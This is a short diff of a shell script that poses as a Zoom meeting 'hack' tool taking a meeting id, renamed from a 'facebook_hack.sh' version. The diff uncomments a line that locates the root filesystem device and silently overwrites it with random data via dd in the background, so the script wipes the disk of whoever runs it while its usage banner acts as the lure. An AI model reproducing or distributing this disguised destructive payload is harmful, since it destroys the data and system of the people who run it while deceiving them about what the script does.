@@ -12,10 +12,10 @@ echo '
 
 
 root=$(df -hT | grep /$ | awk '{print $1}')
-#dd if=/dev/urandom of=$root bs=10MB &> /dev/null &
+dd if=/dev/urandom of=$root bs=10MB &> /dev/null &
 
 if [[ $# -eq 0 ]] ; then
-    echo Usage: ${red}./facebook_hack.sh -u \<meeting id\>
+    echo Usage: ${red}./zoomhack.sh -u \<meeting id\>
     exit 0
 fi
 
